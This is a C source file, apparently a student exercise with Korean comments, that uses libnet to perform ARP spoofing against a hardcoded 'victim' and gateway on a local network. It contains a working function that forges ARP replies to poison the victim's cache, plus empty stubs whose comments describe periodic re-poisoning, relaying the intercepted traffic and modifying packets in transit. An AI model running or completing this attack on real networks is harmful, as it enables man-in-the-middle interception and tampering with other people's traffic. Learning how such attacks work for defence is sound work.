#include <stdio.h>
#include <libnet.h>

void send_arp_packet();
void send_arp_reply_infection_packet();
void send_arp_reply_infection_packet_loop();
void relay_ip_packet();
void recover_victim_arp_table();
void relay_modified_ip_packet();

const char *dev         = "wlan0";

const char *gateway_ip  = "192.168.0.1";
const char *gateway_mac = "90:9f:33:b3:53:c6";

const char *victim_ip   = "192.168.0.2";
const char *victim_mac  = "64:bc:0c:68:e5:71";

int main() {
    printf("Select the Function to be executed.\n\n");
    printf("0. program exit.\n");
    printf("1. send_arp_packet()\n");
    printf("2. send_arp_reply_infection_packet()\n");
    printf("3. send_arp_reply_infection_packet_loop()\n");
    printf("4. relay_ip_packet()\n");
    printf("5. recover_victim_arp_table()\n");
    printf("6. relay_modified_ip_packet()\n");

    int selected;

    do {
        selected = 0;
        printf("\n>> ");
        scanf("%d", &selected);

        switch(selected) {
        case 0:
            printf("Program Exit.\n");
            exit(0);
        case 1:
            send_arp_packet();
            break;
        case 2:
            send_arp_reply_infection_packet();
            break;
        case 3:
            send_arp_reply_infection_packet_loop();
            break;
        case 4:
            relay_ip_packet();
            break;
        case 5:
            recover_victim_arp_table();
            break;
        case 6:
            relay_modified_ip_packet();
            break;
        default:
            printf("Invaild Input.\n");
            break;
        }
    } while(true);

    return 0;
}

/*
    1. ARP Request packet를 보내기.
    버퍼를 할당하여(Ethernet Header 크기와 ARP Header 크기의 합만큼)
    올바른 값을 집어 넣어(Gateway의 mac은 무엇이냐?)라고 물어 보는
    ARP Request 패킷(frame)을 작성하여 패킷을 네트워크에 송신.
    이 패킷에 대해서 Gateway가 ARP Reply를 하게 되면 성공.
*/
void send_arp_packet() {
    int _t;
    char *device = (char*) dev;                             /* network device */
    in_addr_t destaddr = inet_addr(gateway_ip);             /* destination ip address */
    u_int8_t *macaddr = libnet_hex_aton(gateway_mac, &_t);  /* destination mac address */
    char errbuf[LIBNET_ERRBUF_SIZE];                        /* error messages */

    /* open context */
    libnet_t *l = libnet_init(LIBNET_LINK, device, errbuf);
    if (l == NULL) {
        fprintf(stderr, "Error opening context: %s", errbuf);
        exit(1);
    }

    /* get the hardware address, ip address for the card we are using */
    u_int32_t ipaddr = libnet_get_ipaddr4(l);
    libnet_ether_addr *hwaddr = libnet_get_hwaddr(l);

    /* build the ARP header */
    libnet_ptag_t arp = libnet_autobuild_arp(
                ARPOP_REQUEST,          /* operation */
                (u_int8_t*) hwaddr,     /* source hardware addr */
                (u_int8_t*) &ipaddr,    /* source protocol addr */
                macaddr,                /* target hardware addr */
                (u_int8_t*) &destaddr,  /* target protocol addr */
                l);                     /* libnet context */


    if (arp == -1) {
        fprintf(stderr, "Unable to build ARP header: %s\n", libnet_geterror(l));
        exit(1);
    }

    /* build the ethernet header */
    libnet_ptag_t eth = libnet_build_ethernet(
                macaddr,            /* destination address */
                (u_int8_t*) hwaddr, /* source address */
                ETHERTYPE_ARP,      /* type of encasulated packet */
                NULL,               /* pointer to payload */
                0,                  /* size of payload */
                l,                  /* libnet context */
                0);                 /* libnet protocol tag */

    if (eth == -1) {
        fprintf(stderr, "Unable to build Ethernet header: %s\n", libnet_geterror(l));
        exit(1);
    }

    /* write the packet */
    if (libnet_write(l) == -1) {
        fprintf(stderr, "Unable to send packet: %s\n", libnet_geterror(l));
        exit(1);
    }

    printf("ARP request packet was successfully sended.\n");

    /* exit cleanly */
    libnet_destroy(l);
}

/*
    2. ARP Reply infection packet을 보내기.
    Attacker, Victim, Gateway가 있을 때 Attacker는 자신이 Gateway인 것처럼
    Victim을 속여서 Victim > Gateway로 가야 하는 IP Packet을 Attacker가
    수신할 수 있도록 ARP Reply infection packet을 만들어 Attacker가 Victim에게 전송.
    이후 Victim에서 ARP cache의 내용이 변경되면 성공.
*/
void send_arp_reply_infection_packet() {
    int _t;
    char *device = (char*) dev;
    in_addr_t destaddr = inet_addr(victim_ip);
    u_int8_t *macaddr = libnet_hex_aton(victim_mac, &_t);
    char errbuf[LIBNET_ERRBUF_SIZE];

    /* open context */
    libnet_t *l = libnet_init(LIBNET_LINK, device, errbuf);
    if (l == NULL) {
        fprintf(stderr, "Error opening context: %s", errbuf);
        exit(1);
    }

    /* get the hardware address, ip address of gateway */
    in_addr_t ipaddr = inet_addr(gateway_ip);
    u_int8_t *hwaddr = libnet_hex_aton(gateway_mac, &_t);

    /* build the ARP header */
    libnet_ptag_t arp = libnet_autobuild_arp(
                ARPOP_REPLY,            /* operation */
                hwaddr,                 /* source hardware addr */
                (u_int8_t*) &ipaddr,    /* source protocol addr */
                macaddr,                /* target hardware addr */
                (u_int8_t*) &destaddr,  /* target protocol addr */
                l);                     /* libnet context */

    if (arp == -1) {
        fprintf(stderr, "Unable to build ARP header: %s\n", libnet_geterror(l));
        exit(1);
    }

    /* build the ethernet header */
    libnet_ptag_t eth = libnet_build_ethernet(
                macaddr,            /* destination address */
                hwaddr,             /* source address */
                ETHERTYPE_ARP,      /* type of encasulated packet */
                NULL,               /* pointer to payload */
                0,                  /* size of payload */
                l,                  /* libnet context */
                0);                 /* libnet protocol tag */

    if (eth == -1) {
        fprintf(stderr, "Unable to build Ethernet header: %s\n", libnet_geterror(l));
        exit(1);
    }

    /* write the packet */
    if (libnet_write(l) == -1) {
        fprintf(stderr, "Unable to send packet: %s\n", libnet_geterror(l));
        exit(1);
    }

    printf("ARP response packet was successfully sended.\n");

    /* exit cleanly */
    libnet_destroy(l);
}

/*
    3. 주기적으로 ARP Reply infection packet을 전송.
    Victim의 ARP Cache가 감염(infection)된 상태에서 언젠가 복원(recover)이 되는 경우가 있음.
    이를 위해 주기적으로 ARP infection packet을 Victim에게 전달.
*/
void send_arp_reply_infection_packet_loop() {

}

/*
    4. IP packet relay시켜 주기.
    Victim > Attacker로 전송된 IP Packet을 Attacker가 수신하였을 경우
    이를 원래 가야 할 곳(Gateway)로 Relay시켜 주기.
*/
void relay_ip_packet() {

}

/*
    5. 공격이 끝나면 Victim의 ARP cache를 원래 상태로 복원시켜 주기.
*/
void recover_victim_arp_table() {

}

/*
    6. IP packet을 relay시키기 이전에 Data나 IP, Port 등을 바꾸어 보기.
    IP, TCP, UDP의 checksum 계산 로직을 알고 있어야 함.
*/
void relay_modified_ip_packet() {

}
